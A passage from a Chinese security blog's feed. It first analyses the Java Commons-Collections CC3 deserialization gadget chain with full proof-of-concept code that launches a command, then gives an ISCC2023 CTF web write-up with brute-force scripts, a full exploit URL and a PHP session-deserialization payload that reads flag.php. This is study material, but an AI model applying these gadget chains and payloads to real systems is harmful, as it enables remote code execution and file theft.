&#125;\n&#125;\n</code></pre>\n<p>这里通过反射设置了三个值，先来看一下为什么这样设置，上面的逻辑分析中可以看到入口点是 newTransformer</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230710102549579.png\" alt=\"image-20230710102549579\" /></p>\n<p>这里实际上是想要调用 getTransletInstance 方法，看一下这里构造方法没有做任何的操作</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230710102700983.png\" alt=\"image-20230710102700983\" /></p>\n<p>追溯到想要调用的方法中</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230710102945468.png\" alt=\"image-20230710102945468\" /></p>\n<p>这里_name 为空会直接返回 null，所以上面通过反射将__name 任意设置了一个值，_class 要为空才行</p>\n<p><img data-src=\"C:%5CUsers%5CClown%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230710103502179.png\" alt=\"image-20230710103502179\" /></p>\n<p>进一步追溯到 defineTransletClasses，这里如果_bytecodes 为空会抛出一个异常，当然它是要执行的字节码不会为空，_tfactory 如果为空会抛出空指针异常</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230710103723295.png\" alt=\"image-20230710103723295\" /></p>\n<p>这里发现_tfactory 变量是一个 transient 不能被序列化，但是 TemplatesImpl 又继承了 Serializable 所以这里是在 readObject 中有赋值</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230710103938134.png\" alt=\"image-20230710103938134\" /></p>\n<p>这里因为目前是想要直接去代码执行所以，这里就先通过反射赋值，这样运行上面的代码会报错</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230710104056655.png\" alt=\"image-20230710104056655\" /></p>\n<h4 id=\"调试解释继承abstracttranslet\"><a class=\"anchor\" href=\"#调试解释继承abstracttranslet\">#</a> 调试解释继承 AbstractTranslet</h4>\n<p>可以看到这里报了一个空指针的错误，错误位置在 defineTransletClasses，这里就是最开始说的那个 TemplatesImpl 中对加载的字节码是有一定要求，这里在 defineTransletClasses 下断点调试一下，看一下为什么会这样</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230710104458309.png\" alt=\"image-20230710104458309\" /></p>\n<p>这里看到 bytecode 不是 null 已经赋值了</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230710104614590.png\" alt=\"image-20230710104614590\" /></p>\n<p>这里可以看到 tfactory 不是 null 也已经走过来了</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230710104724415.png\" alt=\"image-20230710104724415\" /></p>\n<p>我们的目标 defineClass 类加载其实也是成功的</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230710104855201.png\" alt=\"image-20230710104855201\" /></p>\n<p>这里就是报错的问题所在了，首先这里会判断他的父类的名字是不是常量<em> ABSTRACT_TRANSLET</em>，如果是就将_transletIndex 赋值为 - 1，如果不是就调用一个 put，这里的_auxClasses 是一个 null 所以报错</p>\n<p>这里两种解决思路，一是继承常量指定的类</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230710105414239.png\" alt=\"image-20230710105414239\" /></p>\n<p>第二种方式就是给_auxClasses，一个值，但是后面判断_transletIndex 小于 1 会抛出一个异常</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230710105503172.png\" alt=\"image-20230710105503172\" /></p>\n<p>这里最终是选择前者，所以要执行的代码块就要改为</p>\n<pre><code class=\"language-Java\">package CommonsCollection.Clown_CC3;\n\nimport java.io.IOException;\n\nimport com.sun.org.apache.xalan.internal.xsltc.DOM;\nimport com.sun.org.apache.xalan.internal.xsltc.TransletException;\nimport com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;\nimport com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;\nimport com.sun.org.apache.xml.internal.serializer.SerializationHandler;\n\n/**\n * @BelongsProject: study_java\n * @BelongsPackage: CommonsCollection.Clown_CC3\n * @Author: Clown\n * @CreateTime: 2023-07-10  10:00\n */\npublic class Test extends AbstractTranslet&#123;\n    static &#123;\n        try &#123;\n            Runtime.getRuntime().exec(&quot;calc&quot;);\n        &#125; catch (IOException e) &#123;\n            throw new RuntimeException(e);\n        &#125;\n    &#125;\n\n    @Override\n    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException &#123;\n\n    &#125;\n\n    @Override\n    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException &#123;\n        \n    &#125;\n&#125;\n</code></pre>\n<p>在尝试运行就成功了</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230710110200835.png\" alt=\"image-20230710110200835\" /></p>\n<h3 id=\"整合cc链\"><a class=\"anchor\" href=\"#整合cc链\">#</a> 整合 CC 链</h3>\n<p>上面有了代码执行的部分，这里整合到 CC6 的前半段就行</p>\n<pre><code class=\"language-Java\">package CommonsCollection.Clown_CC3;\n\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;\nimport com.sun.org.apache.xml.internal.security.transforms.Transform;\nimport org.apache.commons.collections.Transformer;\nimport org.apache.commons.collections.functors.ChainedTransformer;\nimport org.apache.commons.collections.functors.ConstantTransformer;\nimport org.apache.commons.collections.functors.InvokerTransformer;\nimport org.apache.commons.collections.keyvalue.TiedMapEntry;\nimport org.apache.commons.collections.map.LazyMap;\nimport org.apache.commons.collections.map.TransformedMap;\n\nimport java.io.*;\nimport java.lang.annotation.Retention;\nimport java.lang.reflect.Constructor;\nimport java.lang.reflect.Field;\nimport java.lang.reflect.InvocationHandler;\nimport java.lang.reflect.Proxy;\nimport java.nio.file.Files;\nimport java.nio.file.Path;\nimport java.nio.file.Paths;\nimport java.util.HashMap;\nimport java.util.Map;\n\npublic class POC1 &#123;\n    public static void Serliazation(Object object) throws Exception&#123;\n        FileOutputStream fileInputStream = new FileOutputStream(&quot;poc1.txt&quot;);\n        ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileInputStream);\n        objectOutputStream.writeObject(object);\n        System.out.println(&quot;Output&quot;);\n    &#125;\n\n    public static void Unserlization() throws Exception&#123;\n        FileInputStream fileInputStream =new FileInputStream(&quot;poc1.txt&quot;);\n        ObjectInputStream objectInputStream =new ObjectInputStream(fileInputStream);\n        objectInputStream.readObject();\n        System.out.println(&quot;Input&quot;);\n    &#125;\n\n    public static void main(String[] args) throws Exception&#123;\n        TemplatesImpl templates = new TemplatesImpl();\n        Class&lt;? extends TemplatesImpl&gt; aClass = templates.getClass();\n        Field name = aClass.getDeclaredField(&quot;_name&quot;);\n        name.setAccessible(true);\n        name.set(templates,&quot;aaaa&quot;);\n\n        Field bytecodes = aClass.getDeclaredField(&quot;_bytecodes&quot;);\n        bytecodes.setAccessible(true);\n        byte[] code = Files.readAllBytes(Paths.get(&quot;E:\\\\study_java\\\\test\\\\Test.class&quot;));\n        byte[][] codes = &#123;code&#125;;\n        bytecodes.set(templates,codes);\n\n        Field tfactory = aClass.getDeclaredField(&quot;_tfactory&quot;);\n        tfactory.setAccessible(true);\n        tfactory.set(templates,new TransformerFactoryImpl());\n\n//        templates.newTransformer();\n        Transformer[] transformers = new Transformer[]&#123;\n                new ConstantTransformer(templates),\n                new InvokerTransformer(&quot;newTransformer&quot;,null,null),\n        &#125;;\n        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);\n\n        HashMap map = new HashMap();\n        Map lazymap = LazyMap.decorate(map,new ConstantTransformer(1));//这里先设置为一个没有用的，下面通过反射设置成目标为了避免在本地本地调试时触发命令执⾏\n//        Map lazymap = LazyMap.decorate(map,chainedTransformer);\n        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazymap,&quot;aaa&quot;);\n\n        HashMap&lt;Object, Object&gt; map2 = new HashMap&lt;&gt;();//这里是触发点\n        map2.put(tiedMapEntry,&quot;bbb&quot;);\n        lazymap.remove(&quot;aaa&quot;);//这里将序列化过程中存入的key删除\n\n        Class clazz = LazyMap.class;//这里通过反射将LazyMap设置为目标值\n        Field factoryField = clazz.getDeclaredField(&quot;factory&quot;);\n        factoryField.setAccessible(true);//私有属性\n        factoryField.set(lazymap,chainedTransformer);//这里设置为目标的危险函数\n\n        Serliazation(map2);\n        Unserlization();\n    &#125;\n&#125;\n</code></pre>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230710111411877.png\" alt=\"image-20230710111411877\" /></p>\n<p>最后的流程大概这样</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230710112102028.png\" alt=\"image-20230710112102028\" /></p>\n<h2 id=\"补充\"><a class=\"anchor\" href=\"#补充\">#</a> 补充</h2>\n<pre><code class=\"language-Java\">package CommonsCollection.Clown_CC3;\n\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;\nimport org.apache.commons.collections.Transformer;\nimport org.apache.commons.collections.functors.ChainedTransformer;\nimport org.apache.commons.collections.functors.ConstantTransformer;\nimport org.apache.commons.collections.functors.InstantiateTransformer;\nimport org.apache.commons.collections.functors.InvokerTransformer;\nimport org.apache.commons.collections.keyvalue.TiedMapEntry;\nimport org.apache.commons.collections.map.LazyMap;\n\nimport javax.xml.transform.Templates;\nimport java.io.FileInputStream;\nimport java.io.FileOutputStream;\nimport java.io.ObjectInputStream;\nimport java.io.ObjectOutputStream;\nimport java.lang.reflect.Field;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\nimport java.time.temporal.Temporal;\nimport java.util.HashMap;\nimport java.util.Map;\n\n/**\n * @BelongsProject: study_java\n * @BelongsPackage: CommonsCollection.Clown_CC3\n * @Author: Clown\n * @CreateTime: 2023-07-10  11:31\n */\npublic class POC2 &#123;\n    public static void Serliazation(Object object) throws Exception&#123;\n        FileOutputStream fileInputStream = new FileOutputStream(&quot;poc1.txt&quot;);\n        ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileInputStream);\n        objectOutputStream.writeObject(object);\n        System.out.println(&quot;Output&quot;);\n    &#125;\n\n    public static void Unserlization() throws Exception&#123;\n        FileInputStream fileInputStream =new FileInputStream(&quot;poc1.txt&quot;);\n        ObjectInputStream objectInputStream =new ObjectInputStream(fileInputStream);\n        objectInputStream.readObject();\n        System.out.println(&quot;Input&quot;);\n    &#125;\n\n    public static void main(String[] args) throws Exception&#123;\n        TemplatesImpl templates = new TemplatesImpl();\n        Class&lt;? extends TemplatesImpl&gt; aClass = templates.getClass();\n        Field name = aClass.getDeclaredField(&quot;_name&quot;);\n        name.setAccessible(true);\n        name.set(templates,&quot;aaaa&quot;);\n\n        Field bytecodes = aClass.getDeclaredField(&quot;_bytecodes&quot;);\n        bytecodes.setAccessible(true);\n        byte[] code = Files.readAllBytes(Paths.get(&quot;E:\\\\study_java\\\\test\\\\Test.class&quot;));\n        byte[][] codes = &#123;code&#125;;\n        bytecodes.set(templates,codes);\n\n        Field tfactory = aClass.getDeclaredField(&quot;_tfactory&quot;);\n        tfactory.setAccessible(true);\n        tfactory.set(templates,new TransformerFactoryImpl());\n\n//        templates.newTransformer();\n\n        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]&#123;Templates.class&#125;, new Object[]&#123;templates&#125;);\n        Transformer[] transformers = new Transformer[]&#123;\n                new ConstantTransformer(TrAXFilter.class),\n                instantiateTransformer\n        &#125;;\n        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);\n\n        HashMap map = new HashMap();\n        Map lazymap = LazyMap.decorate(map,new ConstantTransformer(1));//这里先设置为一个没有用的，下面通过反射设置成目标为了避免在本地本地调试时触发命令执⾏\n//        Map lazymap = LazyMap.decorate(map,chainedTransformer);\n        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazymap,&quot;aaa&quot;);\n\n        HashMap&lt;Object, Object&gt; map2 = new HashMap&lt;&gt;();//这里是触发点\n        map2.put(tiedMapEntry,&quot;bbb&quot;);\n        lazymap.remove(&quot;aaa&quot;);//这里将序列化过程中存入的key删除\n\n        Class clazz = LazyMap.class;//这里通过反射将LazyMap设置为目标值\n        Field factoryField = clazz.getDeclaredField(&quot;factory&quot;);\n        factoryField.setAccessible(true);//私有属性\n        factoryField.set(lazymap,chainedTransformer);//这里设置为目标的危险函数\n\n//        Serliazation(map2);\n        Unserlization();\n    &#125;\n&#125;\n</code></pre>\n<p>这里看到 CC3 的作者是使用了一个 InstantiateTransformer，而没有使用 InvokerTransformer 这里防止黑名单的链子去调用，这里做一个补充</p>\n",
            "tags": [
                "java安全",
                "CC3"
            ]
        },
        {
            "id": "https://blog.xcu.icu/2023/06/01/ISCC2023/",
            "url": "https://blog.xcu.icu/2023/06/01/ISCC2023/",
            "title": "ISCC2023",
            "date_published": "2023-05-31T16:00:00.000Z",
            "content_html": "<h2 id=\"web\"><a class=\"anchor\" href=\"#web\">#</a> Web</h2>\n<h3 id=\"羊了个羊\"><a class=\"anchor\" href=\"#羊了个羊\">#</a> 羊了个羊</h3>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305011302664.png\" alt=\"image-20230501130234361\" /></p>\n<p>网址前加上 view-source: 查看源码</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305011303811.png\" alt=\"image-20230501130347598\" /></p>\n<p>解码得到 flag</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305011304425.png\" alt=\"image-20230501130419360\" /></p>\n<h3 id=\"小周的密码锁\"><a class=\"anchor\" href=\"#小周的密码锁\">#</a> 小周的密码锁</h3>\n<p>页面上一个参数</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305231614225.png\" alt=\"image-20230523161457189\" /></p>\n<p>隐藏了一个参数，这里在前段写死了</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305231614271.png\" alt=\"image-20230523161447232\" /></p>\n<p>尝试修改值，到 5 的时候看见了源码</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305231615438.png\" alt=\"image-20230523161549377\" /></p>\n<pre><code class=\"language-php\">&lt;?php\n    function MyHashCode($str)\n    &#123;\n        $h = 0;\n        $len = strlen($str);\n        for ($i = 0; $i &lt; $len; $i++) &#123;\n            $hash = intval40(intval40(40 * $hash) + ord($str[$i]));\n        &#125;\n        return abs($hash);\n    &#125;\n    \n    function intval40($code)\n    &#123;\n        $falg = $code &gt;&gt; 32;\n        if ($falg == 1) &#123;\n            $code = ~($code - 1);\n            return $code * -1;\n        &#125; else &#123;\n            return $code;\n        &#125;\n    &#125;\n    function Checked($str)&#123;\n        $p1 = '/ISCC/';\n        if (preg_match($p1, $str))&#123;\n            return false;\n        &#125;\n        return true;\n    &#125;\n\n    function SecurityCheck($sha1,$sha2,$user)&#123;\n        \n        $p1 = '/^[a-z]+$/';\n        $p2 = '/^[A-Z]+$/';\n\n        if (preg_match($p1, $sha1) &amp;&amp; preg_match($p2, $sha2))&#123;\n            $sha1 = strtoupper($sha1);\n            $sha2 = strtolower($sha2);\n            $user = strtoupper($user);\n            $crypto = $sha1 ^ $sha2;\n        &#125;\n        else&#123;\n            die(&quot;wrong&quot;);\n        &#125;       \n\n        return array($crypto, $user);\n    &#125;\n    error_reporting(0);\n    \n    $user = $_GET['username'];//user\n    $sha1 = $_GET['sha1'];//sha1\n    $sha2 = $_GET['‮⁦//sha2⁩⁦sha2'];\n    //‮⁦see me ⁩⁦can you \n\n    if (isset ($_GET['password'])) &#123;\n        if ($_GET['password2'] == 5)&#123;\n            show_source(__FILE__);\n        &#125;\n        else&#123;\n            //Try to encrypt\n            if(isset($sha1) &amp;&amp; isset($sha2) &amp;&amp; isset($user))&#123;\n                [$crypto, $user] = SecurityCheck($sha1,$sha2,$user);\n                if((substr(sha1($crypto),-6,6) === substr(sha1($user),-6,6)) &amp;&amp; (substr(sha1($user),-6,6)) === 'a05c53')&#123;//welcome to ISCC\n                    \n                    if((MyHashcode(&quot;ISCCNOTHARD&quot;) === MyHashcode($_GET['password']))&amp;&amp;Checked($_GET['password']))&#123;\n                        include(&quot;f1ag.php&quot;);\n                        echo $flag;\n                    &#125;else&#123;\n                        die(&quot;就快解开了!&quot;);\n                    &#125;\n                    \n                &#125;\n                else&#123;\n                    die(&quot;真的想不起来密码了吗?&quot;);\n                &#125;\n            &#125;else&#123;\n                die(&quot;密钥错误!&quot;);\n            &#125;\n        &#125;    \n    &#125;        \n\n    mt_srand((microtime() ^ rand(1, 10000)) % rand(1, 1e4) + rand(1, 1e4));\n?&gt;\n</code></pre>\n<p>这里有 Unicode 标准中定义的控制字符，这里传入 //sha2% E2%81% A9% E2%81% A6sha2 即可</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305231623339.png\" alt=\"image-20230523162310303\" /></p>\n<p>这里判断 sha1 大写，sha2 小写异或后得到 crypto，这里先将所有可能获取</p>\n<pre><code class=\"language-php\">&lt;?php\n\n$str1='abcdefghijklmnopqrstuvwxyz';\n$str2='ABCDEFGHIJKLMNOPQRSTUVWXYZ';\nfor ($i=0;$i&lt;strlen($str1);$i++)&#123;\n    for ($j=0;$j&lt;strlen($str2);$j++)&#123;\n\n        echo &quot;$str1[$i]和$str2[$j]=====&quot;;\n        echo $str1[$i]^$str2[$j];\n        echo &quot;\\n&quot;;\n    &#125;\n&#125;\n</code></pre>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305231656335.png\" alt=\"image-20230523165640284\" /></p>\n<p>这里能用的可见字符大概是 #&quot;%$'&amp;)(+*-,/.1032547698;!，用这几个字符爆破一下得到一个后 6 位达到题目要求的</p>\n<pre><code class=\"language-php\">&lt;?php\n$string = '#\\&quot;%$\\'&amp;)(+*-,/.1032547698!;';\n$targetHash = 'a05c53';\n\nfor ($i = 0; $i &lt; 999999999999999; $i++) &#123;\n    $randomString = '';\n    $length = mt_rand(0, 9);\n\n    for ($j = 0; $j &lt; $length; $j++) &#123;\n        $randomChar = $string[mt_rand(0, strlen($string) - 1)];\n        $randomString .= $randomChar;\n    &#125;\n\n    if (substr(sha1($randomString), -6) === $targetHash) &#123;\n        echo $randomString . &quot;\\n&quot;;\n    &#125;\n&#125;\n</code></pre>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305231710538.png\" alt=\"image-20230523171014503\" /></p>\n<p>这里选用一个最短的 79;4&quot; 找到对应的字符，sha1=aaaaa&amp;sha2=VXZUC</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305231626044.png\" alt=\"image-20230523162613992\" /></p>\n<p>这里 sha1 和 user 的值 sha 后，后 6 位相同同时为 a05c53</p>\n<pre><code class=\"language-php\">&lt;?php\nfor($i=0;$i&lt;9999999999;$i++)&#123;\n    if(substr(sha1($i),-6,6)==&quot;a05c53&quot;)&#123;\n        echo $i;\n        echo &quot;\\n&quot;;\n    &#125;\n&#125;\n</code></pre>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305231631214.png\" alt=\"image-20230523163133178\" /></p>\n<p>这些值都满足条件，取其一即可</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305231714457.png\" alt=\"image-20230523171458413\" /></p>\n<p>最后一个 if</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305231628079.png\" alt=\"image-20230523162841005\" /></p>\n<p>这里通过 MyHashcode 和 checked 检查 password</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305231716616.png\" alt=\"image-20230523171602567\" /></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305231716018.png\" alt=\"image-20230523171613926\" /></p>\n<p>不能包含 ISCC，这里还是暴力一点，写一个脚本爆破一下</p>\n<pre><code class=\"language-php\">&lt;?php\nerror_reporting(0);\nfunction MyHashCode($str)\n&#123;\n    $h = 0;\n    $len = strlen($str);//11 //字符串长度\n    for ($i = 0; $i &lt; $len; $i++) &#123;\n        $hash = intval40(intval40(40 * $hash) + ord($str[$i])); //40次哈希\n    &#125;\n    return abs($hash); //取绝对值\n&#125;\n\nfunction intval40($code) //40位整数\n&#123;\n    $falg = $code &gt;&gt; 32; //判断是否为负数\n    if ($falg == 1) &#123; //如果是负数\n        $code = ~($code - 1); //取反加一\n        return $code * -1; //取负数\n    &#125; else &#123;\n        return $code; //正数\n    &#125;\n&#125;\n\n$length = 4; // 指定生成的随机字符的位数\nfor ($j=0;$j&lt;99999999;$j++) &#123;\n    $randomString = '';\n    for ($i = 0; $i &lt; $length; $i++) &#123;\n        $randomChar = chr(mt_rand(0, 255));\n        $randomString .= $randomChar;\n    &#125;\n    $randomString=urlencode($randomString);\n//    echo urlencode($randomString).&quot;\\n&quot;;\n    if (MyHashcode(&quot;ISCC&quot;)===MyHashcode(urldecode($randomString)))&#123;\n        echo $randomString.&quot;\\n&quot;;\n    &#125;\n&#125;\n</code></pre>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305231823503.png\" alt=\"image-20230523182344443\" /></p>\n<p>最后的 payload</p>\n<pre><code class=\"language-perl\">http://47.94.14.162:10008/?password=K%00%B8%BBNOTHARD&amp;username=14987637&amp;sha1=aaaaa&amp;%E2%80%AE%E2%81%A6//sha2%E2%81%A9%E2%81%A6sha2=VXZUC\n</code></pre>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305231827603.png\" alt=\"image-20230523182758546\" /></p>\n<h3 id=\"老狼老狼几点了\"><a class=\"anchor\" href=\"#老狼老狼几点了\">#</a> 老狼老狼几点了</h3>\n<p>这个时间因为信息很少，只能去尝试一下时间</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305231831475.png\" alt=\"image-20230523183128437\" /></p>\n<p>最后发现输入 12 会跳转到 guess_time.php</p>\n<pre><code class=\"language-php\"> &lt;?php\n//&quot;Hello! welcome to ISCC, wish you have a great time!&quot;;\nheader(&quot;Content-type:text/html;charset=utf-8&quot;);\nerror_reporting(0);\necho time();\n\nclass what_time_is_it&#123;\n    protected $func, $target;\n\n    public function __construct($show_time)&#123;\n        $this-&gt;func = $show_time;\n    &#125;\n\n    public function __wakeup()&#123;\n        echo &quot;wakeup&quot;;\n    &#125;\n\n    public function call_func()&#123;\n        $lets_show_time = unserialize($this-&gt;filter($this-&gt;func));\n        if($lets_show_time['function'] == &quot;show_time&quot;)&#123;\n            echo 'The time is: &quot;. date(&quot;h:i:sa&quot;, time()). &quot;&lt;br&gt;';\n        &#125;\n        else if($lets_show_time['function'] == &quot;hack&quot;)&#123;\n            file_put_contents('time.php', &quot;&lt;?php echo 'The time is: &quot;. date(&quot;h:i:sa&quot;, time()). &quot;&lt;br&gt;';&quot;);\n            echo &quot;做撚啊做，你还是看看时间吧&quot;;\n            include($lets_show_time['file']);\n        &#125;\n        else\n            highlight_file(__file__);\n    &#125;\n\n    private function filter($s)&#123;\n        return preg_replace('/base64/i','', $s);\n    &#125;\n\n    public function __destruct()&#123;\n        $this-&gt;call_func();\n    &#125;\n\n&#125;\n\nif($_SESSION) unset($_SESSION);\n$p1 = $_POST['param1'];\n$p2 = $_POST['param2'];\n$_SESSION['function'] = isset($_GET['func']) ? $_GET['func'] : &quot;highlight_file&quot;;\n$_SESSION['file'] = 'time.php';\nif ($p1 !== $p2 &amp;&amp; md5($p1) === md5($p2))&#123;\n    if (substr($p1, 0, 10) === strval(time()))&#123;\n        echo &quot;Just the time&quot;;\n        extract($_POST);\n        $_SESSION['file'] = 'time.php';\n        $_SESSION['function'] = &quot;show_time&quot;;\n    &#125;\n    else&#123;\n        echo &quot;Sorry wrong time!&quot;;\n    &#125;\n&#125;\n$let_me_show_time = serialize($_SESSION).&quot;&lt;br&gt;&quot;;\n$a = new what_time_is_it($let_me_show_time);\n</code></pre>\n<p>先看 if</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305231837124.png\" alt=\"image-20230523183745040\" /></p>\n<p>md5 强碰撞，且 $p1 前 10 位等于当前时间戳这里使用 fastcoll 工具来生成<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NodWFpY2VuZ2xvdTMwMzIvYXJ0aWNsZS9kZXRhaWxzLzExODE5NzkwNA==\"> (78 条消息) 使用 fastcoll 生成字符串 MD5 碰撞_KogRow 的博客 - CSDN 博客</span></p>\n<pre><code class=\"language-php\">&lt;?php \nfunction readmyfile($path)&#123;\n$fh = fopen($path, &quot;rb&quot;);\n$data = fread($fh, filesize($path));\nfclose($fh);\nreturn $data;\n&#125;\nsystem(&quot;E:\\\\webtools\\\\fastcoll_v1.0.0.5\\\\fastcoll_v1.0.0.5.exe ./1.txt&quot;);\n$a = urlencode(readmyfile(&quot;./1_msg2.txt&quot;));\n$b = urlencode(readmyfile(&quot;./1_msg1.txt&quot;));\nunlink(&quot;./1_msg2.txt&quot;);\nunlink(&quot;./1_msg1.txt&quot;);\necho &quot;\\n&quot;;\n// if(md5((string)urldecode($a))===md5((string)urldecode($b)))&#123;\n// echo $a.&quot;\\n&quot;;\n// &#125;\n// if(urldecode($a)!=urldecode($b))&#123;\n// echo $b;\n// &#125;\necho &quot;param1=$a&amp;param2=$b&quot;;\n</code></pre>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305231856255.png\" alt=\"image-20230523185624197\" /></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305231906896.png\" alt=\"image-20230523190635845\" /></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305231907404.png\" alt=\"image-20230523190731282\" /></p>\n<p>这里进入了这个 if，所以需要让 $_session [‘function’] 不等于’show_time’而等于 hack</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305231911998.png\" alt=\"image-20230523191103945\" /></p>\n<p>这里是用 extract 函数接受 post 参数，直接变量覆盖，然后利用文件包含去读文件，利用 base64 进行字符串逃逸</p>\n<pre><code class=\"language-php\">&lt;?php \nfunction readmyfile($path)&#123;\n$fh = fopen($path, &quot;rb&quot;);\n$data = fread($fh, filesize($path));\nfclose($fh);\nreturn $data;\n&#125;\nsystem(&quot;E:\\\\webtools\\\\fastcoll_v1.0.0.5\\\\fastcoll_v1.0.0.5.exe ./1.txt&quot;);\n$a = urlencode(readmyfile(&quot;./1_msg2.txt&quot;));\n$b = urlencode(readmyfile(&quot;./1_msg1.txt&quot;));\nunlink(&quot;./1_msg2.txt&quot;);\nunlink(&quot;./1_msg1.txt&quot;);\necho &quot;\\n&quot;;\n// if(md5((string)urldecode($a))===md5((string)urldecode($b)))&#123;\n// echo $a.&quot;\\n&quot;;\n// &#125;\n// if(urldecode($a)!=urldecode($b))&#123;\n// echo $b;\n// &#125;\necho &quot;param1=$a&amp;param2=$b&amp;_SESSION[a]=base64base64base64&amp;_SESSION[aaa]=;s:4:\\&quot;file\\&quot;;s:62:\\&quot;php://filter/read=convert.iconv.utf-8.utf-16/resource=flag.php\\&quot;;s:8:\\&quot;function\\&quot;;s:4:\\&quot;hack\\&quot;;s:8:\\&quot;function\\&quot;;s:4:\\&quot;hack\\&quot;;&#125;&quot;;\n</code></pre>\n<p>最后的 payload</p>\n<pre><code class=\"language-perl\">param1=1684843960%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%CA%BF%D7%60%1F6rcJ%9F%85%C7L%9CP%E6%26%B5C%E0%2F%12Z%F62Jy%F9%10%92%26%C3%93%0B%C1%E1%E8%E3%11%C1%C7%BF%BA%22%15%9E%1D%0D%8CRM%3A%7Cv%C8%FE%5E%F6P%24%DB%E4%D1L%04%0B%ED%22E%CAA%0F%E1%A3%FB%07%B1%8C%D2%8F%C6J%A9%FA%F8%F9%60U%CD%17%18%C5%5D%19%5D%B2%3B%29%DF%D6Y%B9%AD%07%85%8F%C0%AF%B0%91z%EC%DF%2C%03%AC%FCS%00b%AB%D4%23%C4S%DB%3Dg&amp;param2=1684843960%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%CA%BF%D7%60%1F6rcJ%9F%85%C7L%9CP%E6%26%B5C%60%2F%12Z%F62Jy%F9%10%92%26%C3%93%0B%C1%E1%E8%E3%11%C1%C7%BF%BA%22%15%1E%1D%0D%8CRM%3A%7Cv%C8%FE%5E%F6P%A4%DB%E4%D1L%04%0B%ED%22E%CAA%0F%E1%A3%FB%07%B1%8C%D2%8F%C6J%A9z%F8%F9%60U%CD%17%18%C5%5D%19%5D%B2%3B%29%DF%D6Y%B9%AD%07%85%8F%C0%AF%B0%11%7B%EC%DF%2C%03%AC%FCS%00b%AB%D4%23DS%DB%3D